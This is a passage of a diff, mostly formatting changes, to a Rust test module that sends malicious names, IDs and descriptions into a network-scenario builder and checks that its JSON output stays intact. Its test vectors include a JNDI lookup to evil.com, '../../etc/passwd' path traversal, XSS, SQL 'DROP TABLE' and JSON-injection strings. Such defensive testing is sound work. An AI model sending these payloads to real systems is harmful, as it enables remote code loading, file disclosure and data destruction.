+                            assert!(
+                                !error_msg.contains('\0'),
+                                "Node attack {}: Error should not contain null bytes",
+                                attack_idx
+                            );
                         }
                     }
-                },
+                }
                 Err(e) => {
                     // Rejection of malicious input is expected behavior
                     println!("Node attack {} rejected: {}", attack_idx, e);
@@ -5457,8 +6451,10 @@ mod tests {
             }
 
             // Test link name corruption
-            if malicious_name.len() < 100 { // Skip extremely long names for link tests
-                let mut link_attack_builder = ScenarioBuilder::new(&format!("json_attack_link_{}", attack_idx));
+            if malicious_name.len() < 100 {
+                // Skip extremely long names for link tests
+                let mut link_attack_builder =
+                    ScenarioBuilder::new(&format!("json_attack_link_{}", attack_idx));
                 link_attack_builder.add_node("node_a");
                 link_attack_builder.add_node("node_b");
                 link_attack_builder.add_link(malicious_name, "node_a", "node_b");
@@ -5472,15 +6468,25 @@ mod tests {
                     match link_serialize_result {
                         Ok(link_json) => {
                             // Verify link corruption doesn't affect JSON integrity
-                            assert!(!link_json.contains("\"injected\":"),
-                                "Link attack {}: JSON should not contain injected fields", attack_idx);
+                            assert!(
+                                !link_json.contains("\"injected\":"),
+                                "Link attack {}: JSON should not contain injected fields",
+                                attack_idx
+                            );
 
-                            let link_parse_back: Result<serde_json::Value, _> = serde_json::from_str(&link_json);
-                            assert!(link_parse_back.is_ok(),
-                                "Link attack {}: JSON should parse back correctly", attack_idx);
-                        },
+                            let link_parse_back: Result<serde_json::Value, _> =
+                                serde_json::from_str(&link_json);
+                            assert!(
+                                link_parse_back.is_ok(),
+                                "Link attack {}: JSON should parse back correctly",
+                                attack_idx
+                            );
+                        }
                         Err(e) => {
-                            println!("Link attack {}: Serialization failed safely: {}", attack_idx, e);
+                            println!(
+                                "Link attack {}: Serialization failed safely: {}",
+                                attack_idx, e
+                            );
                         }
                     }
                 }
@@ -5488,9 +6494,14 @@ mod tests {
 
             // Test assertion name corruption
             if malicious_name.len() < 100 {
-                let mut assertion_attack_builder = ScenarioBuilder::new(&format!("json_attack_assertion_{}", attack_idx));
+                let mut assertion_attack_builder =
+                    ScenarioBuilder::new(&format!("json_attack_assertion_{}", attack_idx));
                 assertion_attack_builder.add_node("assertion_node");
-                assertion_attack_builder.add_assertion(malicious_name, "assertion_node", "test_condition");
+                assertion_attack_builder.add_assertion(
+                    malicious_name,
+                    "assertion_node",
+                    "test_condition",
+                );
                 assertion_attack_builder.set_seed(888888 + attack_idx as u64);
 
                 let assertion_attack_result = assertion_attack_builder.build();
@@ -5501,15 +6512,25 @@ mod tests {
                     match assertion_serialize_result {
                         Ok(assertion_json) => {
                             // Verify assertion corruption doesn't compromise JSON
-                            assert!(!assertion_json.contains("\"injected\":"),
-                                "Assertion attack {}: JSON should not contain injected fields", attack_idx);
+                            assert!(
+                                !assertion_json.contains("\"injected\":"),
+                                "Assertion attack {}: JSON should not contain injected fields",
+                                attack_idx
+                            );
 
-                            let assertion_parse_back: Result<serde_json::Value, _> = serde_json::from_str(&assertion_json);
-                            assert!(assertion_parse_back.is_ok(),
-                                "Assertion attack {}: JSON should parse back correctly", attack_idx);
-                        },
+                            let assertion_parse_back: Result<serde_json::Value, _> =
+                                serde_json::from_str(&assertion_json);
+                            assert!(
+                                assertion_parse_back.is_ok(),
+                                "Assertion attack {}: JSON should parse back correctly",
+                                attack_idx
+                            );
+                        }
                         Err(e) => {
-                            println!("Assertion attack {}: Serialization failed safely: {}", attack_idx, e);
+                            println!(
+                                "Assertion attack {}: Serialization failed safely: {}",
+                                attack_idx, e
+                            );
                         }
                     }
                 }
@@ -5517,7 +6538,9 @@ mod tests {
         }
 
         // Test scenario name corruption
-        for (name_attack_idx, (malicious_scenario_name, _)) in json_corruption_attacks.iter().take(5).enumerate() {
+        for (name_attack_idx, (malicious_scenario_name, _)) in
+            json_corruption_attacks.iter().take(5).enumerate()
+        {
             if malicious_scenario_name.len() < 100 {
                 let mut name_attack_builder = ScenarioBuilder::new(malicious_scenario_name);
                 name_attack_builder.add_node("safe_node");
@@ -5531,21 +6554,33 @@ mod tests {
                     match name_serialize_result {
                         Ok(name_json) => {
                             // Verify scenario name corruption is handled
-                            let name_parse_back: Result<serde_json::Value, _> = serde_json::from_str(&name_json);
-                            assert!(name_parse_back.is_ok(),
-                                "Scenario name attack {}: JSON should parse correctly", name_attack_idx);
+                            let name_parse_back: Result<serde_json::Value, _> =
+                                serde_json::from_str(&name_json);
+                            assert!(
+                                name_parse_back.is_ok(),
+                                "Scenario name attack {}: JSON should parse correctly",
+                                name_attack_idx
+                            );
 
                             // Check that malicious scenario name doesn't break structure
                             if let Ok(parsed) = name_parse_back {
-                                if let Some(parsed_name) = parsed.get("name").and_then(|v| v.as_str()) {
+                                if let Some(parsed_name) =
+                                    parsed.get("name").and_then(|v| v.as_str())
+                                {
                                     // Name should be properly escaped/sanitized
-                                    assert!(!parsed_name.contains("\"injected\":"),
-                                        "Scenario name attack {}: Parsed name should not contain injection", name_attack_idx);
+                                    assert!(
+                                        !parsed_name.contains("\"injected\":"),
+                                        "Scenario name attack {}: Parsed name should not contain injection",
+                                        name_attack_idx
+                                    );
                                 }
                             }
-                        },
+                        }
                         Err(e) => {
-                            println!("Scenario name attack {}: Serialization failed safely: {}", name_attack_idx, e);
+                            println!(
+                                "Scenario name attack {}: Serialization failed safely: {}",
+                                name_attack_idx, e
+                            );
                         }
                     }
                 }
@@ -5555,7 +6590,11 @@ mod tests {
         // Test massive JSON stress (potential memory exhaustion via JSON)
         let mut massive_builder = ScenarioBuilder::new("massive_json_test");
         for i in 0..50 {
-            massive_builder.add_node(&format!("massive_node_{}_with_long_name_{}", i, "x".repeat(100)));
+            massive_builder.add_node(&format!(
+                "massive_node_{}_with_long_name_{}",
+                i,
+                "x".repeat(100)
+            ));
         }
         massive_builder.set_seed(1234567);
 
@@ -5568,36 +6607,54 @@ mod tests {
             let serialize_duration = serialize_start.elapsed();
 
             // Verify serialization completes in reasonable time
-            assert!(serialize_duration < Duration::from_secs(5),
-                "Massive JSON serialization should complete in reasonable time: {:?}", serialize_duration);
+            assert!(
+                serialize_duration < Duration::from_secs(5),
+                "Massive JSON serialization should complete in reasonable time: {:?}",
+                serialize_duration
+            );
 
             match massive_serialize_result {
                 Ok(massive_json) => {
                     // Verify JSON size is reasonable
-                    assert!(massive_json.len() < 10_000_000,
-                        "Massive JSON should not exceed reasonable size limit: {} bytes", massive_json.len());
+                    assert!(
+                        massive_json.len() < 10_000_000,
+                        "Massive JSON should not exceed reasonable size limit: {} bytes",
+                        massive_json.len()
+                    );
 
                     // Test parse-back performance
                     let parse_start = Instant::now();
-                    let parse_result: Result<serde_json::Value, _> = serde_json::from_str(&massive_json);
+                    let parse_result: Result<serde_json::Value, _> =
+                        serde_json::from_str(&massive_json);
                     let parse_duration = parse_start.elapsed();
 
-                    assert!(parse_duration < Duration::from_secs(3),
-                        "Massive JSON parsing should complete in reasonable time: {:?}", parse_duration);
-                    assert!(parse_result.is_ok(),
-                        "Massive JSON should parse back successfully");
+                    assert!(
+                        parse_duration < Duration::from_secs(3),
+                        "Massive JSON parsing should complete in reasonable time: {:?}",
+                        parse_duration
+                    );
+                    assert!(
+                        parse_result.is_ok(),
+                        "Massive JSON should parse back successfully"
+                    );
 
-                    println!("Massive JSON test: {} bytes serialized in {:?}, parsed in {:?}",
-                        massive_json.len(), serialize_duration, parse_duration);
-                },
+                    println!(
+                        "Massive JSON test: {} bytes serialized in {:?}, parsed in {:?}",
+                        massive_json.len(),
+                        serialize_duration,
+                        parse_duration
+                    );
+                }
                 Err(e) => {
                     println!("Massive JSON serialization failed safely: {}", e);
                 }
             }
         }
 
-        println!("JSON serialization corruption test completed: {} attack vectors + scenario name attacks + massive JSON stress test",
-            json_corruption_attacks.len());
+        println!(
+            "JSON serialization corruption test completed: {} attack vectors + scenario name attacks + massive JSON stress test",
+            json_corruption_attacks.len()
+        );
     }
 
     #[cfg(test)]
@@ -5609,16 +6666,16 @@ mod tests {
         fn test_scenario_name_injection_and_boundary_attacks() {
             // Attack 1: Name injection attempts with malicious content
             let malicious_names = vec![
-                "",  // Empty name
-                "../../etc/passwd",  // Path traversal
-                "${jndi:ldap://evil.com}",  // JNDI injection
-                "\x00\x01\u{00FF}\x7F",  // Binary data
-                "name_with\nlines\rand\ttabs",  // Control characters
-                "very_long_name_".repeat(10000),  // Memory exhaustion
-                "unicode_🦀_🔒_⚡_name",  // Unicode injection
-                r#"","injected_field":"malicious_value","evil":""#,  // JSON injection
-                "<script>alert('xss')</script>",  // XSS attempt
-                "DROP TABLE scenarios;--",  // SQL injection attempt
+                "",                                                 // Empty name
+                "../../etc/passwd",                                 // Path traversal
+                "${jndi:ldap://evil.com}",                          // JNDI injection
+                "\x00\x01\u{00FF}\x7F",                             // Binary data
+                "name_with\nlines\rand\ttabs",                      // Control characters
+                "very_long_name_".repeat(10000),                    // Memory exhaustion
+                "unicode_🦀_🔒_⚡_name",                            // Unicode injection
+                r#"","injected_field":"malicious_value","evil":""#, // JSON injection
+                "<script>alert('xss')</script>",                    // XSS attempt
+                "DROP TABLE scenarios;--",                          // SQL injection attempt
             ];
 
             for malicious_name in malicious_names {
@@ -5637,7 +6694,11 @@ mod tests {
                 // Should either succeed with preserved malicious name or fail with proper error
                 match build_result {
                     Ok(scenario) => {
-                        assert_eq!(scenario.name(), malicious_name, "Built scenario should preserve name");
+                        assert_eq!(
+                            scenario.name(),
+                            malicious_name,
+                            "Built scenario should preserve name"
+                        );
                         assert!(scenario.nodes().len() >= 2, "Should have required nodes");
                     }
                     Err(ScenarioBuilderError::EmptyName) if malicious_name.is_empty() => {
@@ -5651,11 +6712,11 @@ mod tests {
 
             // Attack 2: Description field injection attacks
             let malicious_descriptions = vec![
-                "x".repeat(1_000_000),  // 1MB description
-                "\x00\x01\x02\x03\x04\x05",  // Null bytes and control chars
-                "desc with\r\nCRLF\r\ninjection",  // CRLF injection
-                r#"{"injected": "json", "in": "description"}"#,  // JSON in description
-                "desc_".repeat(100000),  // Very long description
+                "x".repeat(1_000_000),                          // 1MB description
+                "\x00\x01\x02\x03\x04\x05",                     // Null bytes and control chars
+                "desc with\r\nCRLF\r\ninjection",               // CRLF injection
+                r#"{"injected": "json", "in": "description"}"#, // JSON in description
+                "desc_".repeat(100000),                         // Very long description
             ];
 
             for desc in malicious_descriptions {
@@ -5673,16 +6734,20 @@ mod tests {
 
                 if build_result.is_ok() {
                     let scenario = build_result.unwrap();
-                    assert_eq!(scenario.description(), desc, "Description should be preserved");
+                    assert_eq!(
+                        scenario.description(),
+                        desc,
+                        "Description should be preserved"
+                    );
                 }
             }
 
             // Attack 3: Seed manipulation and overflow attacks
             let seed_attacks = vec![
-                0,              // Zero seed (should fail validation)
-                u64::MAX,       // Maximum seed
-                1,              // Minimum valid seed
-                u64::MAX / 2,   // Midpoint seed
+                0,                                        // Zero seed (should fail validation)
+                u64::MAX,                                 // Maximum seed
+                1,                                        // Minimum valid seed
+                u64::MAX / 2,                             // Midpoint seed
                 12345678901234567890_u64.wrapping_add(1), // Potential overflow
             ];
 
@@ -5729,7 +6794,7 @@ mod tests {
                 let add_result = max_builder.add_node(
                     format!("node_{}", i),
                     format!("Node {}", i),
-                    NodeRole::Verifier
+                    NodeRole::Verifier,
                 );
 
                 if i <= MAX_NODES_CAP {
@@ -5742,7 +6807,7 @@ mod tests {
 
             // Attack 2: Node ID injection attacks
             let malicious_node_ids = vec![
-                "",  // Empty ID
+                "", // Empty ID
                 "../../etc/passwd",
                 "${jndi:ldap://evil.com}",
                 "\x00\x01\u{00FF}\x7F",
@@ -5750,13 +6815,15 @@ mod tests {
                 "very_long_id_".repeat(1000),
                 "unicode_🦀_id",
                 r#"","malicious":"field"#,
-                "duplicate_id",  // Will be used twice
+                "duplicate_id", // Will be used twice
             ];
 
             for (i, malicious_id) in malicious_node_ids.iter().enumerate() {
-                let add_result = ScenarioBuilder::new("node_id_test")
-                    .seed(42)
-                    .add_node(malicious_id.clone(), format!("Node {}", i), NodeRole::Verifier);
+                let add_result = ScenarioBuilder::new("node_id_test").seed(42).add_node(
+                    malicious_id.clone(),
+                    format!("Node {}", i),
+                    NodeRole::Verifier,
+                );
 
                 match add_result {
                     Ok(updated_builder) => {
@@ -5780,8 +6847,12 @@ mod tests {
                 .expect("First node should be added successfully");
 
             // Try to add second node with same ID
-            let duplicate_result = duplicate_builder.add_node(duplicate_id, "Second Node", NodeRole::Proposer);
-            assert!(duplicate_result.is_err(), "Duplicate node ID should be rejected");
+            let duplicate_result =
+                duplicate_builder.add_node(duplicate_id, "Second Node", NodeRole::Proposer);
+            assert!(
+                duplicate_result.is_err(),
+                "Duplicate node ID should be rejected"
+            );
 
             if let Err(ScenarioBuilderError::DuplicateNode { node_id }) = duplicate_result {
                 assert_eq!(node_id, duplicate_id, "Error should contain duplicate ID");
@@ -5792,7 +6863,7 @@ mod tests {
             // Attack 4: Node name injection attacks
             let malicious_node_names = vec![
                 "normal_name",
-                "",  // Empty name
+                "", // Empty name
                 "name_with_\x00_nulls",
                 "very_long_name_".repeat(5000),
                 "unicode_name_🔒_⚡_🦀",
@@ -5801,9 +6872,11 @@ mod tests {
             ];
 
             for (i, name) in malicious_node_names.iter().enumerate() {
-                let add_result = ScenarioBuilder::new("node_name_test")
-                    .seed(42)
-                    .add_node(format!("node_{}", i), name.clone(), NodeRole::Verifier);
+                let add_result = ScenarioBuilder::new("node_name_test").seed(42).add_node(
+                    format!("node_{}", i),
+                    name.clone(),
+                    NodeRole::Verifier,
+                );
 
                 if let Ok(updated_builder) = add_result {
                     let node = &updated_builder.nodes[0];
@@ -5812,11 +6885,7 @@ mod tests {
             }
 
             // Attack 5: Node role exhaustive testing
-            let all_roles = vec![
-                NodeRole::Verifier,
-                NodeRole::Proposer,
-                NodeRole::Observer,
-            ];
+            let all_roles = vec![NodeRole::Verifier, NodeRole::Proposer, NodeRole::Observer];
 
             for role in all_roles {
                 let role_result = ScenarioBuilder::new("role_test")
@@ -5844,14 +6913,14 @@ mod tests {
 
             // Try links with invalid endpoints
             let invalid_endpoints = vec![
-                ("nonexistent1", "node1"),  // First endpoint doesn't exist
-                ("node1", "nonexistent2"),  // Second endpoint doesn't exist
-                ("nonexistent1", "nonexistent2"),  // Both endpoints don't exist
-                ("", "node1"),  // Empty first endpoint
-                ("node1", ""),  // Empty second endpoint
-                ("", ""),  // Both endpoints empty
-                ("../../etc/passwd", "node1"),  // Path traversal in endpoint
-                ("node1", "${jndi:ldap://evil.com}"),  // Injection in endpoint
+                ("nonexistent1", "node1"),            // First endpoint doesn't exist
+                ("node1", "nonexistent2"),            // Second endpoint doesn't exist
+                ("nonexistent1", "nonexistent2"),     // Both endpoints don't exist
+                ("", "node1"),                        // Empty first endpoint
+                ("node1", ""),                        // Empty second endpoint
+                ("", ""),                             // Both endpoints empty
+                ("../../etc/passwd", "node1"),        // Path traversal in endpoint
+                ("node1", "${jndi:ldap://evil.com}"), // Injection in endpoint
             ];
 
             for (from, to) in invalid_endpoints {
@@ -5859,21 +6928,32 @@ mod tests {
                     "test_link",
                     from,
                     to,
-                    LinkFaultConfig::default()
+                    LinkFaultConfig::default(),
                 );
 
                 // Should fail with invalid endpoint error
-                assert!(link_result.is_err(), "Invalid link endpoints should be rejected");
+                assert!(
+                    link_result.is_err(),
+                    "Invalid link endpoints should be rejected"
+                );
 
-                if let Err(ScenarioBuilderError::InvalidLinkEndpoint { link_id, from_node, to_node }) = link_result {
+                if let Err(ScenarioBuilderError::InvalidLinkEndpoint {
+                    link_id,
+                    from_node,
+                    to_node,
+                }) = link_result
+                {
                     assert_eq!(link_id, "test_link");
-                    assert!(from_node == from || to_node == to, "Error should contain invalid endpoint");
+                    assert!(
+                        from_node == from || to_node == to,
+                        "Error should contain invalid endpoint"
+                    );
                 }
             }
 
             // Attack 2: Link ID injection attacks
             let malicious_link_ids = vec![
-                "",  // Empty link ID
+                "", // Empty link ID
                 "../../etc/passwd",
                 "${jndi:ldap://evil.com}",
                 "\x00\x01\u{00FF}\x7F",
@@ -5881,7 +6961,7 @@ mod tests {
                 "very_long_link_id_".repeat(1000),
                 "unicode_link_🔒",
                 r#"","malicious_field":"value"#,
-                "duplicate_link",  // Will be used for duplication test
+                "duplicate_link", // Will be used for duplication test
             ];
 
             for malicious_id in malicious_link_ids {
@@ -5889,7 +6969,7 @@ mod tests {
                     malicious_id.clone(),
                     "node1",
                     "node2",
-                    LinkFaultConfig::default()
+                    LinkFaultConfig::default(),
                 );
 
                 match link_result {
@@ -5906,29 +6986,32 @@ mod tests {
 
             // Attack 3: Duplicate link ID detection
             let duplicate_id = "duplicate_link";
-            let mut link_builder = base_builder.clone()
+            let mut link_builder = base_builder
+                .clone()
                 .add_link(duplicate_id, "node1", "node2", LinkFaultConfig::default())
                 .expect("First link should be added successfully");
 
             // Try to add second link with same ID
-            let duplicate_link_result = link_builder.add_link(
-                duplicate_id,
-                "node2",
-                "node1",
-                LinkFaultConfig::default()
-            );
+            let duplicate_link_result =
+                link_builder.add_link(duplicate_id, "node2", "node1", LinkFaultConfig::default());
 
-            assert!(duplicate_link_result.is_err(), "Duplicate link ID should be rejected");
+            assert!(
+                duplicate_link_result.is_err(),
+                "Duplicate link ID should be rejected"
+            );
             if let Err(ScenarioBuilderError::DuplicateLink { link_id }) = duplicate_link_result {
-                assert_eq!(link_id, duplicate_id, "Error should contain duplicate link ID");
+                assert_eq!(
+                    link_id, duplicate_id,
+                    "Error should contain duplicate link ID"
+                );
             }
 
             // Attack 4: Self-referencing link attempts
             let self_link_result = base_builder.clone().add_link(
                 "self_link",
                 "node1",
-                "node1",  // Same node for both endpoints
-                LinkFaultConfig::default()
+                "node1", // Same node for both endpoints
+                LinkFaultConfig::default(),
             );
 
             // Should either accept self-links or reject with appropriate error
@@ -5957,14 +7040,17 @@ mod tests {
                     format!("link_{}", i),
                     "node1",
                     "node2",
-                    LinkFaultConfig::default()
+                    LinkFaultConfig::default(),
                 );
 
                 match link_result {
                     Ok(updated_builder) => {
                         stress_builder = updated_builder;
                         if i < MAX_LINKS {
-                            assert!(stress_builder.links.len() <= MAX_LINKS, "Links should be bounded");
+                            assert!(
+                                stress_builder.links.len() <= MAX_LINKS,
+                                "Links should be bounded"
+                            );
                         }
                     }
                     Err(_) => {
@@ -5974,7 +7060,10 @@ mod tests {
                 }
             }
 
-            assert!(stress_builder.links.len() <= MAX_LINKS, "Final link count should be bounded");
+            assert!(
+                stress_builder.links.len() <= MAX_LINKS,
+                "Final link count should be bounded"
+            );
         }
 
         #[test]
@@ -5991,7 +7080,7 @@ mod tests {
 
             // Attack 1: Fault profile name injection
             let malicious_profile_names = vec![
-                "",  // Empty profile name
+                "", // Empty profile name
                 "../../etc/passwd",
                 "${jndi:ldap://evil.com}",
                 "\x00\x01\u{00FF}\x7F",
@@ -6006,14 +7095,16 @@ mod tests {
                 let profile_result = base_builder.clone().add_fault_profile(
                     profile_name.clone(),
                     "link1",
-                    fault_config
+                    fault_config,
                 );
 
                 match profile_result {
                     Ok(updated_builder) => {
                         // Should preserve malicious profile name
-                        assert!(updated_builder.fault_profiles.contains_key(&profile_name),
-                               "Fault profile should be stored with malicious name");
+                        assert!(
+                            updated_builder.fault_profiles.contains_key(&profile_name),
+                            "Fault profile should be stored with malicious name"
+                        );
                     }
                     Err(_) => {
                         // Some malicious names might fail validation
@@ -6034,14 +7125,20 @@ mod tests {
                 let profile_result = base_builder.clone().add_fault_profile(
                     "test_profile",
                     link_name.clone(),
-                    LinkFaultConfig::default()
+                    LinkFaultConfig::default(),
                 );
 
                 // Should fail with unknown link error
-                assert!(profile_result.is_err(),
-                       "Fault profile targeting nonexistent link should fail");
+                assert!(
+                    profile_result.is_err(),
+                    "Fault profile targeting nonexistent link should fail"
+                );
 
-                if let Err(ScenarioBuilderError::UnknownFaultProfileLink { profile_name, link_id }) = profile_result {
+                if let Err(ScenarioBuilderError::UnknownFaultProfileLink {
+                    profile_name,
+                    link_id,
+                }) = profile_result
+                {
                     assert_eq!(profile_name, "test_profile");
                     assert_eq!(link_id, link_name);
                 }
@@ -6076,11 +7173,12 @@ mod tests {
                 let profile_result = base_builder.clone().add_fault_profile(
                     format!("extreme_profile_{}", i),
                     "link1",
-                    fault_config.clone()
+                    fault_config.clone(),
                 );
 
                 if let Ok(updated_builder) = profile_result {
-                    let stored_config = updated_builder.fault_profiles
+                    let stored_config = updated_builder
+                        .fault_profiles
                         .get(&format!("extreme_profile_{}", i))
                         .expect("Profile should be stored");
 
@@ -6097,7 +7195,7 @@ mod tests {
                 let profile_result = multi_profile_builder.add_fault_profile(
                     format!("profile_{}", i),
                     "link1",
-                    LinkFaultConfig::default()
+                    LinkFaultConfig::default(),
                 );
 
                 if let Ok(updated_builder) = profile_result {
@@ -6108,8 +7206,10 @@ mod tests {
             }
 
             // Should handle multiple profiles on same link
-            assert!(!multi_profile_builder.fault_profiles.is_empty(),
-                   "Should store multiple fault profiles");
+            assert!(
+                !multi_profile_builder.fault_profiles.is_empty(),
+                "Should store multiple fault profiles"
+            );
 
             // Attack 5: Fault profile with NaN/Infinity values
             let nan_fault_config = LinkFaultConfig {
@@ -6120,19 +7220,20 @@ mod tests {
                 corruption_pct: f64::NEG_INFINITY,
             };
 
-            let nan_result = base_builder.clone().add_fault_profile(
-                "nan_profile",
-                "link1",
-                nan_fault_config
-            );
+            let nan_result =
+                base_builder
+                    .clone()
+                    .add_fault_profile("nan_profile", "link1", nan_fault_config);
 
             // Should handle NaN/Infinity values appropriately
             match nan_result {
                 Ok(updated_builder) => {
                     let config = updated_builder.fault_profiles.get("nan_profile").unwrap();
                     // System should either reject NaN/Inf or handle them safely
-                    assert!(config.packet_loss_pct.is_nan() || config.packet_loss_pct.is_finite(),
-                           "NaN values should be handled safely");
+                    assert!(
+                        config.packet_loss_pct.is_nan() || config.packet_loss_pct.is_finite(),
+                        "NaN values should be handled safely"
+                    );
                 }
                 Err(_) => {
                     // Rejection of NaN/Infinity values is also acceptable
@@ -6180,7 +7281,10 @@ mod tests {
                         // Assertion was added - will be validated during build
                         assert!(!updated_builder.assertions.is_empty());
                     }
-                    Err(ScenarioBuilderError::InvalidAssertionNode { node_id, assertion: _ }) => {
+                    Err(ScenarioBuilderError::InvalidAssertionNode {
+                        node_id,
+                        assertion: _,
+                    }) => {
                         // Expected error for nonexistent nodes
                         assert!(node_id.contains("nonexistent") || node_id.is_empty());
                     }
@@ -6228,12 +7332,31 @@ mod tests {
                     // Should preserve malicious content in assertions
                     let stored_assertion = &updated_builder.assertions[0];
                     match (stored_assertion, &assertion) {
-                        (ScenarioAssertion::MessageDelivered { message_type: stored_type, .. },
-                         ScenarioAssertion::MessageDelivered { message_type: original_type, .. }) => {
-                            assert_eq!(stored_type, original_type, "Message type should be preserved");
+                        (
+                            ScenarioAssertion::MessageDelivered {
+                                message_type: stored_type,
+                                ..
+                            },
+                            ScenarioAssertion::MessageDelivered {
+                                message_type: original_type,
+                                ..
+                            },
+                        ) => {
+                            assert_eq!(
+                                stored_type, original_type,
+                                "Message type should be preserved"
+                            );
                         }
-                        (ScenarioAssertion::NodeState { expected_state: stored_state, .. },
-                         ScenarioAssertion::NodeState { expected_state: original_state, .. }) => {
+                        (
+                            ScenarioAssertion::NodeState {
+                                expected_state: stored_state,
+                                ..
+                            },
+                            ScenarioAssertion::NodeState {
+                                expected_state: original_state,
+                                ..
+                            },
+                        ) => {
                             assert_eq!(stored_state, original_state, "State should be preserved");
                         }
                         _ => {} // Other assertion types
@@ -6255,8 +7378,10 @@ mod tests {
                 match assertion_result {
                     Ok(updated_builder) => {
                         assertion_builder = updated_builder;
-                        assert!(assertion_builder.assertions.len() <= MAX_ASSERTIONS,
-                               "Assertions should be bounded");
+                        assert!(
+                            assertion_builder.assertions.len() <= MAX_ASSERTIONS,
+                            "Assertions should be bounded"
+                        );
                     }
                     Err(_) => {
                         // Capacity exceeded
@@ -6281,15 +7406,15 @@ mod tests {
                 },
                 ScenarioAssertion::LinkBandwidth {
                     link: "test_link".to_string(),
-                    min_mbps: -1.0,  // Negative bandwidth
+                    min_mbps: -1.0, // Negative bandwidth
                 },
                 ScenarioAssertion::LinkBandwidth {
                     link: "test_link".to_string(),
-                    min_mbps: f64::NAN,  // NaN bandwidth
+                    min_mbps: f64::NAN, // NaN bandwidth
                 },
                 ScenarioAssertion::LinkBandwidth {
                     link: "test_link".to_string(),
-                    min_mbps: f64::INFINITY,  // Infinite bandwidth
+                    min_mbps: f64::INFINITY, // Infinite bandwidth
                 },
             ];
 
@@ -6300,8 +7425,10 @@ mod tests {
                     let stored_assertion = &updated_builder.assertions[0];
                     if let ScenarioAssertion::LinkBandwidth { min_mbps, .. } = stored_assertion {
                         // Extreme values should be preserved or rejected gracefully
-                        assert!(min_mbps.is_finite() || min_mbps.is_infinite() || min_mbps.is_nan(),
-                               "Numeric values should be handled safely");
+                        assert!(
+                            min_mbps.is_finite() || min_mbps.is_infinite() || min_mbps.is_nan(),
+                            "Numeric values should be handled safely"
+                        );
                     }
                 }
             }
@@ -6311,7 +7438,11 @@ mod tests {
 
             if let Ok(scenario) = empty_assertion_build {
                 // Should handle scenarios with no assertions
-                assert_eq!(scenario.assertions().len(), 0, "Should handle empty assertions");
+                assert_eq!(
+                    scenario.assertions().len(),
+                    0,
+                    "Should handle empty assertions"
+                );
                 assert_eq!(scenario.nodes().len(), 2, "Should still have nodes");
             }
         }
@@ -6329,7 +7460,7 @@ mod tests {
                     role: NodeRole::Verifier,
                 },
                 VirtualNode {
-                    id: "".to_string(),  // Empty ID
+                    id: "".to_string(), // Empty ID
                     name: "Corrupted Node".to_string(),
                     role: NodeRole::Proposer,
                 },
@@ -6355,17 +7486,18 @@ mod tests {
                 .expect("Should add node2");
 
             // Manually add link with invalid reference
-            inconsistent_builder.links = vec![
-                VirtualLink {
-                    id: "bad_link".to_string(),
-                    from: "nonexistent_node".to_string(),
-                    to: "node2".to_string(),
-                    fault_config: LinkFaultConfig::default(),
-                },
-            ];
+            inconsistent_builder.links = vec![VirtualLink {
+                id: "bad_link".to_string(),
+                from: "nonexistent_node".to_string(),
+                to: "node2".to_string(),
+                fault_config: LinkFaultConfig::default(),
+            }];
 
             let inconsistent_build = inconsistent_builder.build();
-            assert!(inconsistent_build.is_err(), "Should fail with invalid link endpoint");
+            assert!(
+                inconsistent_build.is_err(),
+                "Should fail with invalid link endpoint"
+            );
 
             // Attack 3: Build with extreme collection sizes
             let mut extreme_builder = ScenarioBuilder::new("extreme_test").seed(42);
@@ -6373,7 +7505,11 @@ mod tests {
             // Add maximum number of nodes
             for i in 0..MAX_NODES {
                 extreme_builder = extreme_builder
-                    .add_node(format!("node_{}", i), format!("Node {}", i), NodeRole::Verifier)
+                    .add_node(
+                        format!("node_{}", i),
+                        format!("Node {}", i),
+                        NodeRole::Verifier,
+                    )
                     .expect("Should add node within limits");
             }
 
@@ -6384,12 +7520,15 @@ mod tests {
 
             // Attack 4: Build scenario with zero seed
             let zero_seed_result = ScenarioBuilder::new("zero_seed_test")
-                .seed(0)  // Invalid seed
+                .seed(0) // Invalid seed
                 .add_node("node1", "Node 1", NodeRole::Verifier)
                 .and_then(|b| b.add_node("node2", "Node 2", NodeRole::Proposer))
                 .and_then(|b| b.build());
 
-            assert!(zero_seed_result.is_err(), "Zero seed should fail validation");
+            assert!(
+                zero_seed_result.is_err(),
+                "Zero seed should fail validation"
+            );
             if let Err(ScenarioBuilderError::NoSeed) = zero_seed_result {
                 // Expected error
             } else {
@@ -6417,7 +7556,7 @@ mod tests {
                         jitter_ms: i as u64 / 2,
                         bandwidth_mbps: 100.0 + (i % 1000) as f64,
                         corruption_pct: (i % 10) as f64,
-                    }
+                    },
                 );
 
                 if let Ok(updated_builder) = fault_result {
@@ -6474,27 +7613,36 @@ mod tests {
                 .expect("Should build scenario");
 
             // Attack 1: JSON serialization with malicious field injection
-            let scenario_with_injection = ScenarioBuilder::new(r#"test","injected_field":"malicious_value"#)
-                .description(r#"desc","evil":"payload","injected":true#)
+            let scenario_with_injection =
+                ScenarioBuilder::new(r#"test","injected_field":"malicious_value"#)
+                    .description(
+                        r#"desc","evil":"payload","injected":true#)
                 .seed(42)
-                .add_node(r#"node","type":"evil"#, r#"name","injection":"attempt"#, NodeRole::Verifier)
-                .expect("Should add malicious node")
-                .add_node("node2", "Node 2", NodeRole::Proposer)
-                .expect("Should add node2")
-                .build()
-                .expect("Should build scenario with injections");
+                .add_node(r#"node","type":"evil"#,
+                        r#"name","injection":"attempt"#,
+                        NodeRole::Verifier,
+                    )
+                    .expect("Should add malicious node")
+                    .add_node("node2", "Node 2", NodeRole::Proposer)
+                    .expect("Should add node2")
+                    .build()
+                    .expect("Should build scenario with injections");
 
             // Serialize scenario with injection attempts
             match serde_json::to_string(&scenario_with_injection) {
                 Ok(json_str) => {
                     // Malicious content should be properly escaped
-                    assert!(!json_str.contains(r#""injected_field":"malicious_value""#),
-                           "JSON injection should be escaped");
-                    assert!(json_str.contains(r#"test\",\"injected_field"#) ||
-                           json_str.contains(r#"test\",\\"injected_field"#) ||
-                           json_str.contains("test") ||
-                           !json_str.contains("injected_field"),
-                           "Malicious content should be escaped or sanitized");
+                    assert!(
+                        !json_str.contains(r#""injected_field":"malicious_value""#),
+                        "JSON injection should be escaped"
+                    );
+                    assert!(
+                        json_str.contains(r#"test\",\"injected_field"#)
+                            || json_str.contains(r#"test\",\\"injected_field"#)
+                            || json_str.contains("test")
+                            || !json_str.contains("injected_field"),
+                        "Malicious content should be escaped or sanitized"
+                    );
                 }
                 Err(_) => {
                     // Serialization failure is also acceptable
@@ -6503,14 +7651,14 @@ mod tests {
 
             // Attack 2: JSON deserialization with malicious payloads
             let malicious_json_payloads = vec![
